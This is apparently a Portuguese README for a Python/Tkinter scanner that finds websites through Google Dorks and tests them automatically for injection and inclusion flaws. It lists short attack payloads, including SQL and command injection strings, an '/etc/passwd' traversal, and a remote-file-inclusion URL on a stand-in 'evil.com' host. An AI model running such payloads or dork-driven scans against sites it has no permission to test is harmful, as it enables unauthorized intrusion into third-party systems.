# **Scanner de Vulnerabilidades Web**

## 📌 **Descrição**

O **Scanner de Vulnerabilidades Web** é uma ferramenta avançada desenvolvida em **Python** com interface gráfica utilizando **Tkinter**. Ele permite buscar e testar automaticamente sites vulneráveis, utilizando **Google Dorks** e técnicas automatizadas para detectar falhas de segurança. O scanner identifica vulnerabilidades como **SQL Injection, XSS, LFI, RFI, Open Redirect e NoSQL Injection**, fornecendo resultados detalhados e permitindo a exportação das informações.

A ferramenta é ideal para pesquisadores de segurança, desenvolvedores e profissionais de TI que desejam analisar a segurança de aplicações web de forma automatizada.

---

## 🚀 **Funcionalidades**

✅ **Busca por sites vulneráveis** utilizando **Google Dorks**.
✅ **Teste automático de vulnerabilidades** nos sites encontrados.
✅ **Exportação de resultados** para arquivo de texto.
✅ **Interface gráfica intuitiva**, desenvolvida com **Tkinter**.
✅ **Instalação automática de dependências**.
✅ **Lista extensa de Google Dorks** para facilitar buscas avançadas.
✅ **Execução rápida e eficiente** para testes de pentest.

---

## 📂 **Estrutura do Projeto**

```
/
|-- scanner.py  # Script principal com interface gráfica
|-- README.md   # Documentação do projeto
```

---

## 🛠 **Requisitos**

Este projeto requer **Python 3.x** e as seguintes bibliotecas:

- `requests`
- `googlesearch-python`
- `tkinter` (já embutido no Python)

Caso não tenha os módulos instalados, o próprio script fará a instalação automaticamente.

---

## 📥 **Instalação e Uso**

### 1️⃣ **Clonar o repositório**

```bash
git clone https://github.com/seu-repositorio/scanner-vulnerabilidades.git
cd scanner-vulnerabilidades
```

### 2️⃣ **Executar o scanner**

```bash
python scanner.py
```

---

## 🔍 **Como Funciona**

1. **Inicie o scanner** e insira uma palavra-chave para busca de sites vulneráveis.
2. **O script realiza pesquisas** utilizando **Google Dorks**.
3. **Os sites encontrados são testados** para diversas vulnerabilidades.
4. **Os resultados são exibidos na interface** e podem ser exportados para análise posterior.

---

## 🛑 **Testes de Vulnerabilidades**

O scanner realiza testes automáticos para identificar as seguintes falhas de segurança:

- **SQL Injection** (`OR 1=1 --`, `UNION SELECT NULL,NULL--`)
- **NoSQL Injection** (`{$ne:null}`, `{'$gt': ''}`)
- **Command Injection** (`; ls`, `&& whoami`)
- **XSS (Cross-Site Scripting)** (`<script>alert('XSS')</script>`)
- **LFI (Local File Inclusion)** (`../../../../etc/passwd`)
- **RFI (Remote File Inclusion)** (`http://evil.com/shell.php`)
- **Open Redirect** (`//evil.com`, `https://evil.com`)

---

## ⚠️ **Aviso Legal**

Este software foi desenvolvido **exclusivamente para fins educacionais e testes de segurança autorizados**. O uso indevido desta ferramenta para atacar sistemas sem permissão é estritamente proibido e pode resultar em sanções legais. O autor não se responsabiliza por quaisquer ações ilegais decorrentes do uso desta ferramenta.

---

## 📬 **Contato**

- **Desenvolvido por:** [@astrahvhdev](https://t.me/astrahvhdev)
- **Telegram:** [Contato](https://t.me/astrahvhdev)

---

**"A segurança da informação é uma responsabilidade de todos. Utilize esta ferramenta de maneira ética!"**

